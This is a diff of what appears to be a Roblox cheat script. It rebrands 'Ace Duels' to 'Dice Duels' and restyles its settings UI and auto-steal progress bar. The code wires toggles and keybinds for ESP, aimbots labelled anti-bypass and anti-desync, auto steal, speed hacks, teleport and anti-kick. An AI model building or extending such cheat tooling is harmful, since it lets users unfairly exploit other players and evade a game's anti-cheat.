 left.Name = "SkyLeft"
-left.BackgroundColor3 = Color3.fromRGB(7, 7, 10)
+left.BackgroundColor3 = COLORS.accentSoft
 left.BackgroundTransparency = 0.04
 left.Text = "<"
 left.TextColor3 = COLORS.white
@@ -6175,7 +7067,7 @@ skyValueLabel.ZIndex = 9
 skyValueLabel.Parent = holder
 local right = Instance.new("TextButton")
 right.Name = "SkyRight"
-right.BackgroundColor3 = Color3.fromRGB(7, 7, 10)
+right.BackgroundColor3 = COLORS.accentSoft
 right.BackgroundTransparency = 0.04
 right.Text = ">"
 right.TextColor3 = COLORS.white
@@ -6196,7 +7088,7 @@ skyIndex = nextIndex
 skyTheme = skyThemes[skyIndex]
 if applyCustomSky then applyCustomSky(skyTheme) end
 if skyValueLabel then skyValueLabel.Text = skyTheme end
-saveAceConfig()
+saveDiceConfig()
 end
 left.Activated:Connect(function()
 setSkyIndex(skyIndex - 1)
@@ -6210,9 +7102,9 @@ section(Utility, "ESP", 1)
 do
 local espRow, setESPVisual = toggleRow(Utility, "ESP", espEnabled, 2)
 setPlayerESPVisual = setESPVisual
-_aceBtn = espRow and espRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = espRow and espRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 espEnabled = not espEnabled
 if espEnabled then
 if startPlayerESP then startPlayerESP() end
@@ -6223,16 +7115,16 @@ if BoxedESPOptions then BoxedESPOptions.box = false end
 end
 if refreshBoxedESP then refreshBoxedESP() end
 if setESPVisual then setESPVisual(espEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
 do
 local tracerRow, setTracerVisual = toggleRow(Utility, "Show Tracker", showTracerEnabled, 3)
 setTracerESPVisual = setTracerVisual
-_aceBtn = tracerRow and tracerRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = tracerRow and tracerRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 showTracerEnabled = not showTracerEnabled
 if BoxedESPOptions then
 BoxedESPOptions.tracer = showTracerEnabled
@@ -6240,20 +7132,20 @@ BoxedESPOptions.box = espEnabled == true
 end
 if refreshBoxedESP then refreshBoxedESP() end
 if setTracerVisual then setTracerVisual(showTracerEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
 do
-local row, setVisual = _G.AceActionToggleRow(Utility, "Ragdoll Countdown", ragdollCountdownEnabled, 4)
+local row, setVisual = _G.DiceActionToggleRow(Utility, "Ragdoll Countdown", ragdollCountdownEnabled, 4)
 setRagdollCountdownVisual = setVisual
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 ragdollCountdownEnabled = not ragdollCountdownEnabled
 if ragdollCountdownEnabled then hookRagdollCountdown(LP.Character) else stopRagdollCountdown() end
 if setVisual then setVisual(ragdollCountdownEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
@@ -6263,37 +7155,37 @@ section(Utility, "PERFORMANCE", 7)
 do
 local row, setVisual = toggleRow(Utility, "Stretch Rez", fpsBoostEnabled, 8)
 setFPSBoostVisual = setVisual
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 fpsBoostEnabled = not fpsBoostEnabled
 if fpsBoostEnabled then enableStretchRez() else disableStretchRez() end
 if setVisual then setVisual(fpsBoostEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
 do
 local row, setVisual = toggleRow(Utility, "Anti Lag", antiLagVisualEnabled, 9)
 setAntiLagVisual = setVisual
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 if antiLagVisualEnabled then disableAntiLag() else enableAntiLag() end
 if setVisual then setVisual(antiLagVisualEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
 do
-local row, setVisual = _G.AceActionToggleRow(Utility, "Nuke Optimiser", nukeOptimiserEnabled, 10)
+local row, setVisual = _G.DiceActionToggleRow(Utility, "Nuke Optimiser", nukeOptimiserEnabled, 10)
 setNukeOptimiserVisual = setVisual
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 if nukeOptimiserEnabled then disableNukeOptimizer() else enableNukeOptimizer() end
 if setVisual then setVisual(nukeOptimiserEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
@@ -6301,12 +7193,12 @@ section(Utility, "CAMERA", 11)
 do
 local row, setVisual = toggleRow(Utility, "FOV", fovEnabled, 12)
 setFOVVisual = setVisual
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 if fovEnabled then disableCustomFov() else enableCustomFov() end
 if setVisual then setVisual(fovEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
@@ -6319,58 +7211,72 @@ fovValue = v
 if fovEnabled and workspace.CurrentCamera then workspace.CurrentCamera.FieldOfView = fovValue end
 end
 box.Text = tostring(fovValue)
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 do
 local row, setVisual = toggleRow(Utility, "No Cam Collision", noCamCollisionEnabled, 14)
 setNoCamCollisionVisual = setVisual
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 if noCamCollisionEnabled then disableNoCamCollision() else enableNoCamCollision() end
 if setVisual then setVisual(noCamCollisionEnabled) end
-saveAceConfig()
+saveDiceConfig()
+end)
+end
+end
+section(Utility, "EFFECTS", 15)
+do
+local lightningEnabled = (_G.DiceLightningEnabled == true)
+local row, setVisual = toggleRow(Utility, "Lightning Strikes", lightningEnabled, 16)
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
+_G.DiceLightningEnabled = not (_G.DiceLightningEnabled == true)
+if setVisual then setVisual(_G.DiceLightningEnabled == true) end
+local lc = Main and Main:FindFirstChild("LightningFX")
+if lc then lc.Visible = (_G.DiceLightningEnabled == true) end
+saveDiceConfig()
 end)
 end
 end
 end
 task.wait()
-__AceDuelsSetupVisualsUI()
+__DiceDuelsSetupVisualsUI()
 Settings = pages.SETTINGS
-aceGuiScaleValue = tonumber(savedConfig.aceGuiScaleValue) or aceGuiScaleValue
-aceGuiScaleValue = math.clamp(tonumber(aceGuiScaleValue) or 0.52, 0.50, 1.50)
-aceProgressBarScaleValue = tonumber(savedConfig.aceProgressBarScaleValue) or aceProgressBarScaleValue
-aceMainScale = Main:FindFirstChild("AceMainScale") or Instance.new("UIScale")
-aceMainScale.Name = "AceMainScale"
-aceMainScale.Scale = aceGuiScaleValue
-aceMainScale.Parent = Main
-local function applyAceProgressBarScale()
+diceGuiScaleValue = tonumber(savedConfig.diceGuiScaleValue) or diceGuiScaleValue
+diceGuiScaleValue = math.clamp(tonumber(diceGuiScaleValue) or 0.52, 0.50, 1.50)
+diceProgressBarScaleValue = tonumber(savedConfig.diceProgressBarScaleValue) or diceProgressBarScaleValue
+diceMainScale = Main:FindFirstChild("DiceMainScale") or Instance.new("UIScale")
+diceMainScale.Name = "DiceMainScale"
+diceMainScale.Scale = diceGuiScaleValue
+diceMainScale.Parent = Main
+local function applyDiceProgressBarScale()
 local sg = PlayerGui:FindFirstChild("StealBarGui")
 local bar = sg and sg:FindFirstChild("StealBar")
 if not bar then return end
-local sc = bar:FindFirstChild("AceProgressBarScale") or Instance.new("UIScale")
-sc.Name = "AceProgressBarScale"
-sc.Scale = aceProgressBarScaleValue
+local sc = bar:FindFirstChild("DiceProgressBarScale") or Instance.new("UIScale")
+sc.Name = "DiceProgressBarScale"
+sc.Scale = diceProgressBarScaleValue
 sc.Parent = bar
 end
-_G.__AceDuelsSetupSettingsUI = function()
+_G.__DiceDuelsSetupSettingsUI = function()
 section(Settings, "GUI SETTINGS", 1)
 do
-local row, setVisual = _G.AceActionToggleRow(Settings, "Lock GUI", _G.AceGuiLocked == true, 7)
+local row, setVisual = _G.DiceActionToggleRow(Settings, "Lock GUI", _G.DiceGuiLocked == true, 7)
 setLockGuiVisual = setVisual
 local btn = row and row:FindFirstChild("ToggleButton")
 if btn then
 btn.Activated:Connect(function()
-_G.AceGuiLocked = not (_G.AceGuiLocked == true)
-if setVisual then setVisual(_G.AceGuiLocked == true) end
-if AceUpdateGuiLockVisual then AceUpdateGuiLockVisual() end
-saveAceConfig()
+_G.DiceGuiLocked = not (_G.DiceGuiLocked == true)
+if setVisual then setVisual(_G.DiceGuiLocked == true) end
+if DiceUpdateGuiLockVisual then DiceUpdateGuiLockVisual() end
+saveDiceConfig()
 end)
 end
 end
 -- "Hide Mobile Buttons" row removed; the pad is always shown
--- background image picker removed
 function stepperRow(parent, labelText, defaultValue, order, callback, minValue, maxValue)
 local row = Instance.new("Frame")
 row.Name = labelText
@@ -6400,7 +7306,7 @@ label.Parent = row
 local value = defaultValue
 local minus = Instance.new("TextButton")
 minus.Name = "Minus"
-minus.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+minus.BackgroundColor3 = COLORS.accentSoft
 minus.BackgroundTransparency = 0.1
 minus.BorderSizePixel = 0
 minus.Text = "-"
@@ -6416,7 +7322,7 @@ corner(minus, 7)
 stroke(minus, COLORS.strokeSoft, 1, 0.5)
 local valueBox = Instance.new("TextLabel")
 valueBox.Name = "Value"
-valueBox.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+valueBox.BackgroundColor3 = COLORS.accentSoft
 valueBox.BackgroundTransparency = 0.05
 valueBox.BorderSizePixel = 0
 valueBox.Text = string.format("%.2f", value)
@@ -6432,7 +7338,7 @@ corner(valueBox, 7)
 stroke(valueBox, COLORS.strokeSoft, 1, 0.5)
 local plus = Instance.new("TextButton")
 plus.Name = "Plus"
-plus.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+plus.BackgroundColor3 = COLORS.accentSoft
 plus.BackgroundTransparency = 0.1
 plus.BorderSizePixel = 0
 plus.Text = "+"
@@ -6459,22 +7365,22 @@ setValue(value + 0.05)
 end)
 return row
 end
-stepperRow(Settings, "GUI Scale", aceGuiScaleValue, 3, function(v)
-aceGuiScaleValue = v
-aceMainScale.Scale = v
-saveAceConfig()
+stepperRow(Settings, "GUI Scale", diceGuiScaleValue, 3, function(v)
+diceGuiScaleValue = v
+diceMainScale.Scale = v
+saveDiceConfig()
 end)
-stepperRow(Settings, "Progress Bar Size", aceProgressBarScaleValue, 4, function(v)
-aceProgressBarScaleValue = v
-applyAceProgressBarScale()
-saveAceConfig()
+stepperRow(Settings, "Progress Bar Size", diceProgressBarScaleValue, 4, function(v)
+diceProgressBarScaleValue = v
+applyDiceProgressBarScale()
+saveDiceConfig()
 end)
 speedKeybindRow(Settings, "Toggle UI", "ToggleUI", 5)
 section(Settings, "MOBILE BUTTONS", 6)
-stepperRow(Settings, "Mobile Buttons Size", tonumber(_G.AceMobileButtonScale) or 0.75, 9, function(v)
-_G.AceMobileButtonScale = math.clamp(tonumber(v) or 0.35, 0.30, 1.35)
-if _G.AceApplyMobileButtonSize then _G.AceApplyMobileButtonSize() end
-saveAceConfig()
+stepperRow(Settings, "Mobile Buttons Size", tonumber(_G.DiceMobileButtonScale) or 0.75, 9, function(v)
+_G.DiceMobileButtonScale = math.clamp(tonumber(v) or 0.35, 0.30, 1.35)
+if _G.DiceApplyMobileButtonSize then _G.DiceApplyMobileButtonSize() end
+saveDiceConfig()
 end, 0.30, 1.35)
 do
 local row = baseRow(Settings, "Reset Mobile Buttons", 10)
@@ -6495,14 +7401,14 @@ button.Parent = row
 corner(button, 8)
 stroke(button, Color3.fromRGB(255, 255, 255), 1, 0.18)
 button.Activated:Connect(function()
-if _G.AceResetMobileButtons then
-_G.AceResetMobileButtons()
+if _G.DiceResetMobileButtons then
+_G.DiceResetMobileButtons()
 else
-_G.AceMobileButtonScale = 0.75
-_G.AceHideMobileButtons = false
-if _G.AceApplyMobileButtonsHidden then _G.AceApplyMobileButtonsHidden() end
-if _G.AceApplyMobileButtonSize then _G.AceApplyMobileButtonSize() end
-saveAceConfig()
+_G.DiceMobileButtonScale = 0.75
+_G.DiceHideMobileButtons = false
+if _G.DiceApplyMobileButtonsHidden then _G.DiceApplyMobileButtonsHidden() end
+if _G.DiceApplyMobileButtonSize then _G.DiceApplyMobileButtonSize() end
+saveDiceConfig()
 end
 end)
 end
@@ -6517,7 +7423,7 @@ btn.Activated:Connect(function()
 _introEnabled = not _introEnabled
 if not _introEnabled then stopIntroPlayback(); stopIntroPreview() end
 if setIntroVisual then setIntroVisual(_introEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 if setIntroVisual then setIntroVisual(_introEnabled) end
@@ -6572,7 +7478,7 @@ selectedIntroMusic = selectedIntroMusic + 1
 if selectedIntroMusic > #INTRO_MUSIC_OPTIONS then selectedIntroMusic = 1 end
 if setIntroSongVisual then setIntroSongVisual() end
 previewIntroMusic(selectedIntroMusic)
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 
@@ -6610,10 +7516,10 @@ resetStroke.Parent = resetBtn
 local resetDefaultBg = Color3.fromRGB(232, 232, 238)
 local resetHoverBg = Color3.fromRGB(245, 245, 250)
 local resetConfirmBg = Color3.fromRGB(35, 35, 38)
-local resetDoneBg = Color3.fromRGB(28, 40, 30)
+local resetDoneBg = Color3.fromRGB(30, 30, 33)
 local resetDefaultText = Color3.fromRGB(0, 0, 0)
-local resetConfirmText = Color3.fromRGB(255, 210, 80)
-local resetDoneText = Color3.fromRGB(140, 230, 160)
+local resetConfirmText = Color3.fromRGB(240, 240, 244)
+local resetDoneText = Color3.fromRGB(210, 210, 215)
 local confirmState = false
 local confirmTimer = nil
 function setResetDefaultTheme()
@@ -6665,11 +7571,11 @@ pcall(function()
 local files = {
 CONFIG_FILE,
 KEYBINDS_CONFIG_FILE,
-"AceDuels_MainGUI_Config.json",
-"AceDuelsConfig.json",
-"AceDuels_Settings.json",
-"AceDuels_Keybinds.json",
-"AceDuels_GUI.json",
+"DiceDuels_MainGUI_Config.json",
+"DiceDuelsConfig.json",
+"DiceDuels_Settings.json",
+"DiceDuels_Keybinds.json",
+"DiceDuels_GUI.json",
 }
 for _, fname in ipairs(files) do
 pcall(function()
@@ -6680,35 +7586,34 @@ end)
 end
 end)
 pcall(function()
-aceGuiScaleValue = 0.52
-aceProgressBarScaleValue = 0.83
+diceGuiScaleValue = 0.52
+diceProgressBarScaleValue = 0.83
 NS = 59.5; CS = 28.8; LAGGER_SPEED = 29; LAGGER_CARRY_SPEED = 15
 currentSpeedMode = "Normal"
 autoCarrySpeedEnabled = false
 autoTPHeight = 20
 autoStealEnabled = false; selectedStealMode = "Normal"; autoStealRadius = 62
-_G.AceStealRadii = {Normal = 62, Semi = 9}
+_G.DiceStealRadii = {Normal = 62, Semi = 9}
 selectedAnimationPack = "OFF"; selectedAimbotMode = "Normal"
 AIMBOT_SPEED = 58; LAGGER_AIMBOT_SPEED = 40
-_G.AceAntiBypassAimbotSpeed = 58; _G.AceAntiBypassLaggerAimbotSpeed = 40; ANTI_DESYNC_AIMBOT_SPEED = 58
+_G.DiceAntiBypassAimbotSpeed = 58; _G.DiceAntiBypassLaggerAimbotSpeed = 40; ANTI_DESYNC_AIMBOT_SPEED = 58
 autoSwingEnabled = false; mirrorTPDownEnabled = false; antiDesyncAutoSwingEnabled = false
-_G.AceNormalAimbotOn = false; _G.AceAntiBypassAimbotOn = false; _G.AceAntiDesyncAimbotOn = false
+_G.DiceNormalAimbotOn = false; _G.DiceAntiBypassAimbotOn = false; _G.DiceAntiDesyncAimbotOn = false
 antiRagdollEnabled = false; infJumpEnabled = false; autoTPEnabled = false
 batCounterEnabled = false; medCounterEnabled = false; antiKickEnabled = false; autoResetOnMedEnabled = false
 espEnabled = false; showTracerEnabled = false; ragdollCountdownEnabled = false
 fpsBoostEnabled = false; antiLagVisualEnabled = false; nukeOptimiserEnabled = false
-fovEnabled = false; fovValue = 70; noCamCollisionEnabled = false; _G.AceNoPlayerCollisionEnabled = false
-skyTheme = "Off"; currentBackground = 0
+fovEnabled = false; fovValue = 70; noCamCollisionEnabled = false; _G.DiceNoPlayerCollisionEnabled = false
+skyTheme = "Off"
 selectedIntroMusic = 1; _introEnabled = true
 if setIntroVisual then setIntroVisual(_introEnabled) end
 if setIntroSongVisual then setIntroSongVisual() end
 stopIntroPlayback(); stopIntroPreview()
 autoLeftEnabled = false; autoRightEnabled = false
-_G.AceGuiLocked = false; _G.AceHideMobileButtons = false; _G.AceMobileButtonScale = 0.75
-aceMainScale.Scale = aceGuiScaleValue
-applyAceProgressBarScale()
-applyBackground(0)
-applyDefaultAceKeybinds()
+_G.DiceGuiLocked = false; _G.DiceHideMobileButtons = false; _G.DiceMobileButtonScale = 0.75
+diceMainScale.Scale = diceGuiScaleValue
+applyDiceProgressBarScale()
+applyDefaultDiceKeybinds()
 refreshAllSpeedKeybinds()
 refreshTPDownKeybind()
 if stopAutoTP then stopAutoTP() end
@@ -6719,12 +7624,12 @@ if laggerSpeedBox then laggerSpeedBox.Text = tostring(LAGGER_SPEED) end
 if laggerCarrySpeedBox then laggerCarrySpeedBox.Text = tostring(LAGGER_CARRY_SPEED) end
 if autoTPHeightBox then autoTPHeightBox.Text = tostring(autoTPHeight) end
 if radiusBox then radiusBox.Text = tostring(autoStealRadius) end
-if _G.AceRefreshAimbotSpeedBoxes then _G.AceRefreshAimbotSpeedBoxes() end
+if _G.DiceRefreshAimbotSpeedBoxes then _G.DiceRefreshAimbotSpeedBoxes() end
 if type(applyCustomSky) == "function" then applyCustomSky("Off") end
 if skyValueLabel then skyValueLabel.Text = "Off" end
-if _G.AceResetMobileButtons then _G.AceResetMobileButtons() end
-if _G.AceDuelsApplySavedGameplayStates then _G.AceDuelsApplySavedGameplayStates() end
-saveAceConfig()
+if _G.DiceResetMobileButtons then _G.DiceResetMobileButtons() end
+if _G.DiceDuelsApplySavedGameplayStates then _G.DiceDuelsApplySavedGameplayStates() end
+saveDiceConfig()
 end)
 task.wait(0.35)
 setResetDoneTheme()
@@ -6736,9 +7641,9 @@ end)
 end)
 end
 task.wait()
-_G.__AceDuelsSetupSettingsUI()
-if AceUpdateGuiLockVisual then AceUpdateGuiLockVisual() end
-if _G.AceApplyMobileButtonsHidden then _G.AceApplyMobileButtonsHidden() end
+_G.__DiceDuelsSetupSettingsUI()
+if DiceUpdateGuiLockVisual then DiceUpdateGuiLockVisual() end
+if _G.DiceApplyMobileButtonsHidden then _G.DiceApplyMobileButtonsHidden() end
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
 local isControllerInput = tostring(input.UserInputType):find("Gamepad") ~= nil
 if gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard and not listeningForSpeedKey and not listeningForTPDownKey then return end
@@ -6754,7 +7659,7 @@ Main.Visible = true
 MiniFrame.Visible = false
 Main.Size = FULL_MAIN_SIZE
 end
-saveAceConfig()
+saveDiceConfig()
 return
 end
 if listeningForSpeedKey then
@@ -6781,7 +7686,7 @@ speedKeybinds[targetKey] = input.KeyCode
 end
 listeningForSpeedKey = nil
 refreshAllSpeedKeybinds()
-saveAceConfig()
+saveDiceConfig()
 return
 end
 if listeningForTPDownKey then
@@ -6804,7 +7709,7 @@ end
 listeningForTPDownKey = false
 refreshAllSpeedKeybinds()
 refreshTPDownKeybind()
-saveAceConfig()
+saveDiceConfig()
 return
 end
 if speedKeybinds.SpeedToggle and input.KeyCode == speedKeybinds.SpeedToggle then
@@ -6816,29 +7721,29 @@ toggleLaggerMode()
 return
 end
 if speedKeybinds.Aimbot and input.KeyCode == speedKeybinds.Aimbot then
-if _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked() then
-if _G.AceSafeModeForceStop then _G.AceSafeModeForceStop("SAFE MODE LOCK") end
+if _G.DiceSafeModeIsLocked and _G.DiceSafeModeIsLocked() then
+if _G.DiceSafeModeForceStop then _G.DiceSafeModeForceStop("SAFE MODE LOCK") end
 return
 end
-if _G.AceToggleSelectedAimbot then
-_G.AceToggleSelectedAimbot()
-elseif selectedAimbotMode == "Anti Bypass" and _G.AceStartAntiBypassAimbot and _G.AceStopAntiBypassAimbot then
-if _G.AceAntiBypassAimbotOn then _G.AceStopAntiBypassAimbot() else _G.AceStartAntiBypassAimbot() end
-elseif _G.AceStartNormalAimbot and _G.AceStopNormalAimbot then
-if _G.AceNormalAimbotOn then _G.AceStopNormalAimbot() else _G.AceStartNormalAimbot() end
+if _G.DiceToggleSelectedAimbot then
+_G.DiceToggleSelectedAimbot()
+elseif selectedAimbotMode == "Anti Bypass" and _G.DiceStartAntiBypassAimbot and _G.DiceStopAntiBypassAimbot then
+if _G.DiceAntiBypassAimbotOn then _G.DiceStopAntiBypassAimbot() else _G.DiceStartAntiBypassAimbot() end
+elseif _G.DiceStartNormalAimbot and _G.DiceStopNormalAimbot then
+if _G.DiceNormalAimbotOn then _G.DiceStopNormalAimbot() else _G.DiceStartNormalAimbot() end
 end
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
 return
 end
 if speedKeybinds.AntiDesyncAimbot and input.KeyCode == speedKeybinds.AntiDesyncAimbot then
-if _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked() then
-if _G.AceSafeModeForceStop then _G.AceSafeModeForceStop("SAFE MODE LOCK") end
+if _G.DiceSafeModeIsLocked and _G.DiceSafeModeIsLocked() then
+if _G.DiceSafeModeForceStop then _G.DiceSafeModeForceStop("SAFE MODE LOCK") end
 return
 end
-if _G.AceToggleAntiDesyncAimbot then
-_G.AceToggleAntiDesyncAimbot()
-elseif _G.AceStartAntiDesyncAimbot and _G.AceStopAntiDesyncAimbot then
-if _G.AceAntiDesyncAimbotOn then _G.AceStopAntiDesyncAimbot() else _G.AceStartAntiDesyncAimbot() end
+if _G.DiceToggleAntiDesyncAimbot then
+_G.DiceToggleAntiDesyncAimbot()
+elseif _G.DiceStartAntiDesyncAimbot and _G.DiceStopAntiDesyncAimbot then
+if _G.DiceAntiDesyncAimbotOn then _G.DiceStopAntiDesyncAimbot() else _G.DiceStartAntiDesyncAimbot() end
 end
 return
 end
@@ -6847,15 +7752,15 @@ runDropBrainrot()
 return
 end
 if speedKeybinds.AutoLeft and input.KeyCode == speedKeybinds.AutoLeft then
-if _G.AceSetAutoLeft then _G.AceSetAutoLeft(not autoLeftEnabled) end
+if _G.DiceSetAutoLeft then _G.DiceSetAutoLeft(not autoLeftEnabled) end
 return
 end
 if speedKeybinds.AutoRight and input.KeyCode == speedKeybinds.AutoRight then
-if _G.AceSetAutoRight then _G.AceSetAutoRight(not autoRightEnabled) end
+if _G.DiceSetAutoRight then _G.DiceSetAutoRight(not autoRightEnabled) end
 return
 end
 if speedKeybinds.InstantReset and input.KeyCode == speedKeybinds.InstantReset then
-if _G.AceCursedInstaReset then _G.AceCursedInstaReset() end
+if _G.DiceCursedInstaReset then _G.DiceCursedInstaReset() end
 return
 end
 if tpDownKeybind and input.KeyCode == tpDownKeybind then
@@ -6864,7 +7769,7 @@ return
 end
 end)
 setTab("MOVEMENT")
-_G.__AceDuelsSetupStealBar = function()
+_G.__DiceDuelsSetupStealBar = function()
 local RunService   = game:GetService("RunService")
 local UIS = UserInputService
 local TS = TweenService
@@ -6883,7 +7788,7 @@ gui.Parent = PlayerGui
 function drag(frame)
 local dragging, dragStart, startPos = false, nil, nil
 frame.InputBegan:Connect(function(input)
-if _G.AceGuiLocked == true then return end
+if _G.DiceGuiLocked == true then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
@@ -6900,133 +7805,124 @@ frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startP
 end
 end)
 end
--- Auto grab bar: rounded blue-bordered card, "AUTO STEAL" header with a
--- status dot, a wait-range/FPS/percent row, and a full-width blue fill.
--- Names below are unchanged so setBarState, StealBar.SetProgress and the
--- FPS loop keep driving it.
-local BAR_EDGE = Color3.fromRGB(56, 138, 255)
-local BAR_GLOW = Color3.fromRGB(126, 186, 255)
-local BAR_DIM = Color3.fromRGB(120, 146, 186)
+-- ═══════════════════════════════════════════════════════════════
+-- STEAL BAR
+-- A rounded pill: percentage on the left, a track with a round knob
+-- riding the fill, radius on the right, and a stat line underneath.
+-- ═══════════════════════════════════════════════════════════════
 local pbFrame = Instance.new("Frame", gui)
 pbFrame.Name = "StealBar"
-pbFrame.Size = UDim2.new(0, 372, 0, 86)
-pbFrame.Position = UDim2.new(0.5, -186, 1, -128)
-pbFrame.BackgroundColor3 = Color3.fromRGB(6, 11, 22)
+-- Tall enough for the stat line to sit inside the pill rather than
+-- hanging off the bottom of it.
+pbFrame.Size = UDim2.new(0, 372, 0, 60)
+pbFrame.Position = UDim2.new(0.5, -186, 1, -100)
+pbFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+pbFrame.BackgroundTransparency = 0.05
 pbFrame.BorderSizePixel = 0
 pbFrame.Active = true
 pbFrame.ClipsDescendants = true
-Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(0, 12)
+Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(1, 0)
 local pbSt = Instance.new("UIStroke", pbFrame)
-pbSt.Color = BAR_EDGE
+pbSt.Color = THEME_ACCENT_BRIGHT
 pbSt.Thickness = 1.6
-pbSt.Transparency = 0.1
+pbSt.Transparency = 0.12
 drag(pbFrame)
 local pbScale = Instance.new("UIScale")
-pbScale.Name = "AceProgressBarScale"
-pbScale.Scale = aceProgressBarScaleValue or 1
+pbScale.Name = "DiceProgressBarScale"
+pbScale.Scale = diceProgressBarScaleValue or 1
 pbScale.Parent = pbFrame
-
-local statusDot = Instance.new("Frame", pbFrame)
-statusDot.Name = "StatusDot"
-statusDot.Size = UDim2.new(0, 8, 0, 8)
-statusDot.Position = UDim2.new(0, 14, 0, 15)
-statusDot.BackgroundColor3 = BAR_GLOW
-statusDot.BorderSizePixel = 0
-statusDot.ZIndex = 5
-Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
-
-local stealLbl = Instance.new("TextLabel", pbFrame)
-stealLbl.Size = UDim2.new(0, 220, 0, 16)
-stealLbl.Position = UDim2.new(0, 30, 0, 11)
-stealLbl.BackgroundTransparency = 1
-stealLbl.Text = "AUTO STEAL"
-stealLbl.TextColor3 = BAR_GLOW
-stealLbl.Font = Enum.Font.GothamBold
-stealLbl.TextSize = 13
-stealLbl.TextXAlignment = Enum.TextXAlignment.Left
-stealLbl.ZIndex = 5
-
-local waitLbl = Instance.new("TextLabel", pbFrame)
-waitLbl.Name = "WaitRange"
-waitLbl.Size = UDim2.new(0, 90, 0, 14)
-waitLbl.Position = UDim2.new(0, 14, 0, 36)
-waitLbl.BackgroundTransparency = 1
-waitLbl.Text = "WAIT RANGE"
-waitLbl.TextColor3 = BAR_DIM
-waitLbl.Font = Enum.Font.GothamBold
-waitLbl.TextSize = 10
-waitLbl.TextXAlignment = Enum.TextXAlignment.Left
-waitLbl.ZIndex = 5
-
-local progressRadLbl = Instance.new("TextLabel", pbFrame)
-progressRadLbl.Size = UDim2.new(0, 190, 0, 18)
-progressRadLbl.Position = UDim2.new(0, 106, 0, 34)
-progressRadLbl.BackgroundTransparency = 1
-progressRadLbl.Text = "FPS 0 / 0ms"
-progressRadLbl.TextColor3 = Color3.fromRGB(240, 246, 255)
-progressRadLbl.Font = Enum.Font.GothamSemibold
-progressRadLbl.TextSize = 13
-progressRadLbl.TextScaled = false
-progressRadLbl.TextWrapped = false
-progressRadLbl.TextXAlignment = Enum.TextXAlignment.Left
-progressRadLbl.ZIndex = 5
-
 local progressPct = Instance.new("TextLabel", pbFrame)
-progressPct.Size = UDim2.new(0, 56, 0, 18)
-progressPct.Position = UDim2.new(1, -70, 0, 34)
+progressPct.Name = "Percent"
+progressPct.Size = UDim2.new(0, 46, 0, 26)
+progressPct.Position = UDim2.new(0, 14, 0, 8)
 progressPct.BackgroundTransparency = 1
 progressPct.Text = "0%"
-progressPct.TextColor3 = BAR_GLOW
+progressPct.TextColor3 = Color3.fromRGB(255, 255, 255)
 progressPct.Font = Enum.Font.GothamBold
-progressPct.TextSize = 13
-progressPct.TextXAlignment = Enum.TextXAlignment.Right
+progressPct.TextSize = 14
+progressPct.TextXAlignment = Enum.TextXAlignment.Left
 progressPct.ZIndex = 5
-
+local progressRadLbl = Instance.new("TextLabel", pbFrame)
+progressRadLbl.Name = "Radius"
+progressRadLbl.Size = UDim2.new(0, 86, 0, 26)
+progressRadLbl.Position = UDim2.new(1, -100, 0, 8)
+progressRadLbl.BackgroundTransparency = 1
+progressRadLbl.Text = "Radius: 0"
+progressRadLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
